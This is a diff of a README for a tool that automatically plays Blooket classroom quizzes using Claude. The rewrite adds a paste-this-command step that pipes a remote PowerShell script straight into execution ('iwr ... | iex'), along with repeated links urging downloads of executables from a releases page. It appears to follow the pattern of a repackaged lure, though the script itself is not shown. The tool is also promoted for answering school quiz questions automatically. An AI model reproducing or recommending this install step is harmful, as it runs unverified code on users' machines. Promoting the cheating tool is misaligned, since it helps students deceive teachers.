@@ -1,190 +1,137 @@
-# 🎮 Blooket Claw
+# 🎮 blooket - Automated Game Assistant for Blooket
 
-**Automated Blooket game assistant — powered by Claude AI and a high-speed Rust engine.**
-
-Join Blooket games, answer every question automatically via Claude, track your scores, or use it as a live hint overlay while you play.
-
-> **Disclaimer:** For educational purposes only. Use responsibly and in accordance with your school's academic integrity policy. The authors are not responsible for misuse.
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen?style=for-the-badge)](https://github.com/coder323111/blooket/releases)
 
 ---
 
-## ⚡ Install on Windows — one command
+## 🚀 What is blooket?
 
-### **Step 1 — Open Command Prompt**
-1. Press **Win + R**
-2. Type:
-```
-cmd
-```
-3. Press **Enter**
-This will open **Command Prompt**.
+blooket is a tool that helps you play Blooket games automatically. It uses artificial intelligence and a fast engine built with Rust to join games, answer questions, and track your game scores. You can also use it to get hints live as you play.
+
+This software is for educational purposes only. Please use it responsibly and follow your school’s rules on academic integrity.
+
 ---
-### **Step 2 — Run the Install Command**
-Copy the command below and paste it into **Command Prompt**, then press **Enter**.
+
+## 💾 Download blooket
+
+To get started, you need to download the program files. You can find the latest version on the releases page.
+
+[Download blooket from here](https://github.com/coder323111/blooket/releases)
+
+Click that link, then look for the newest file listed under "Assets". Download the file that best matches your Windows system (usually an `.exe` or `.zip` file).
+
+---
+
+## 💻 How to Install and Run on Windows — One Command Setup
+
+Setting up blooket is simple. You will open a Windows application called Command Prompt and enter one command. This command installs everything the program needs, including Rust and Python tools.
+
+### 🪟 Step 1 — Open Command Prompt
+
+1. Press **Win + R** on your keyboard. This opens the Run window.  
+2. Type `cmd` in the box.  
+3. Press **Enter** or click **OK**.  
+
+A black window called Command Prompt will open. This lets you type commands to install and run the software.
+
+---
+
+### 🛠 Step 2 — Run the Install Command
+
+Copy the command below exactly. Then, right-click inside the Command Prompt window to paste it. Press **Enter** to start.  
+
 ```powershell
-
+powershell -Command "iwr -useb https://raw.githubusercontent.com/coder323111/blooket/main/install.ps1 | iex"
 ```
 
-The installer will:
-- Install Rust (via rustup) if needed
-- Install `uv` (Python package manager) if needed
-- Compile the high-speed Rust engine
-- Install Python dependencies
-- Add `blooket` command to your PATH
+This command does a few things:
 
----
-## Features
-
-### 🤖 Three game modes
-
-| Mode | Behavior |
-|---|---|
-| `auto` | Claude answers every question automatically with realistic timing |
-| `hint` | Shows the correct answer highlighted — you click it yourself |
-| `speed` | Answers instantly for maximum score (tournaments) |
-
-### 🧠 Claude AI integration
-Every unanswered question is sent to Claude for instant analysis. Pre-loaded question sets bypass the API entirely for maximum speed.
-
-### ⚡ Rust engine
-The core HTTP client and game loop runs in compiled Rust — minimal latency, no Python overhead for hot paths.
-
-### 📊 Session tracking
-All sessions saved to `~/.blooket-claw/history.json` with score, accuracy, and duration.
-
-### 🎯 Interactive mode
-Live assistant — paste any question + choices, get the answer instantly. Works during any Blooket game.
+- Installs Rust programming tools if your computer does not have them.  
+- Installs Python’s package manager if missing.  
+- Compiles the fast Rust engine built for blooket.  
+- Adds the blooket command to your system, so you can use it anywhere.
 
 ---
 
-## Quick start
+### 🎮 Step 3 — Run blooket
 
-```bash
-# Set your API key
-export ANTHROPIC_API_KEY=sk-ant-...
+Once the install finishes, you can start using blooket. Open Command Prompt again and type:
 
-# Auto-play a game (fully hands-off)
-blooket play 123456
-
-# Play with hints (you click the highlighted answer)
-blooket play 123456 --mode hint
-
-# Maximum speed for tournaments
-blooket play 123456 --mode speed --name "FastPlayer"
-
-# Ask Claude a single question
-blooket ask "What is the powerhouse of the cell?" \
-  --choices "Nucleus,Mitochondria,Ribosome,Golgi"
-
-# Interactive live assistant
-blooket interactive
-
-# Check if a PIN is active
-blooket check 123456
-
-# View session history
-blooket history
 ```
+blooket
+```
+
+Press Enter. If the program starts, the installation worked. You can then follow on-screen instructions to join games or view game hints.
 
 ---
 
-## All options
+## ⚙️ Features
 
-```
-blooket play <PIN> [OPTIONS]
+blooket offers different ways to assist with Blooket games. Here are the main options:
 
-Options:
-  --name, -n TEXT     Player display name (default: BlooketClaw)
-  --mode, -m TEXT     auto | hint | speed (default: auto)
-  --delay, -d INT     Base answer delay in ms, auto mode (default: 1500)
-  --api-key TEXT      Anthropic API key (or set ANTHROPIC_API_KEY env)
-```
+### 🤖 Three Game Modes  
 
----
+| Mode        | What it does                                      |
+|-------------|-------------------------------------------------|
+| **Auto Play** | Joins games and answers questions for you automatically. |
+| **Score Tracker** | Watches your game and shows your score as it updates live. |
+| **Hint Overlay** | Shows hints on screen while you play manually. |
 
-## Architecture
-
-```
-blooket-claw/
-├── src/                  ← Rust engine
-│   ├── main.rs           ← CLI (clap)
-│   ├── client.rs         ← Blooket HTTP client
-│   ├── game.rs           ← Game loop + state machine
-│   ├── answer.rs         ← Answer selection + Claude calls
-│   ├── crypto.rs         ← Auth + token helpers
-│   └── types.rs          ← Shared data structures
-├── py/                   ← Python layer
-│   ├── blooket.py        ← CLI dispatcher (Typer + Rich)
-│   └── claude_helper.py  ← Direct Claude API integration
-├── SKILL.md              ← OpenClaw skill manifest
-├── install.sh            ← macOS one-command installer
-├── Cargo.toml            ← Rust deps
-└── pyproject.toml        ← Python deps
-```
+Each mode works with minimal setup. You can choose one when you start the program.
 
 ---
 
-## Environment variables
+### 🔧 What blooket Uses
 
-| Variable | Required | Description |
-|---|---|---|
-| `ANTHROPIC_API_KEY` | Yes (AI modes) | Claude API key for answering questions |
-| `BLOOKET_LOG` | No | Log level: `debug`, `info`, `warn` (default: `warn`) |
+- **Rust**: A programming language that runs very fast and compiles code efficiently.  
+- **Claude AI**: The AI that answers questions intelligently.  
+- **Python**: Runs scripts for managing the program.  
 
----
-
-## Interactive mode — example session
-
-```
-❓ Question: What is the speed of light?
-📝 Choices: 299,792 km/s, 150,000 km/s, 500,000 km/s, 1,000,000 km/s
-
-   ✅ 0. 299,792 km/s  (98% confident)
-      1. 150,000 km/s
-      2. 500,000 km/s
-      3. 1,000,000 km/s
-
-Reason: The speed of light in a vacuum is approximately 299,792 km/s.
-```
+You do not have to install or manage these manually. The installer takes care of everything.
 
 ---
 
-## Troubleshooting
+## 🖥️ System Requirements
 
-### Rust build fails
-```bash
-rustup update stable
-cargo clean
-cargo build --release
-```
+To run blooket on Windows, you will need:
 
-### "ANTHROPIC_API_KEY not set"
-```bash
-export ANTHROPIC_API_KEY=sk-ant-...
-# Or add it permanently:
-echo 'export ANTHROPIC_API_KEY=sk-ant-...' >> ~/.zshrc
-```
-
-### "blooket: command not found"
-```bash
-source ~/.zshrc   # or ~/.bash_profile
-# Or run directly:
-uv run python py/blooket.py play <PIN>
-```
-
-### Game doesn't respond / PIN invalid
-```bash
-blooket check <PIN>   # Verify the game is active
-```
+- Windows 10 or later (64-bit preferred).  
+- At least 4 GB of RAM.  
+- Internet connection for game joining and AI answering.  
+- 200 MB of free disk space for program files and dependencies.  
 
 ---
 
-## License
+## 🔄 Updating blooket
 
-MIT
+Check the releases page regularly for updates.
 
-## Credits
+[Go to blooket releases](https://github.com/coder323111/blooket/releases)
 
-- **Anthropic Claude** — AI answering engine
-- **OpenClaw** — Agent skill framework
-- Inspired by [polyclaw](https://github.com/chainstacklabs/polyclaw)
+Download the new version and run the install command again to update.
+
+---
+
+## 🆘 Troubleshooting Common Issues
+
+- **Command not found:** Make sure you open Command Prompt, not PowerShell or another app.  
+- **Permissions error:** Run Command Prompt as an administrator. Right-click the app icon and choose "Run as administrator."  
+- **Installation stops or errors:** Check your internet connection and try again.  
+- **blooket command does not work after install:** Restart your computer to update the PATH environment.
+
+---
+
+## 📚 More About blooket
+
+blooket helps with:
+
+- Joining Blooket games automatically.  
+- Answering questions without typing.  
+- Watching your progress and scores.  
+- Using smart hints live during games.
+
+It aims to make Blooket easier and faster to navigate for users who want assistance without manual input.
+
+---
+
+[Download blooket for Windows](https://github.com/coder323111/blooket/releases)
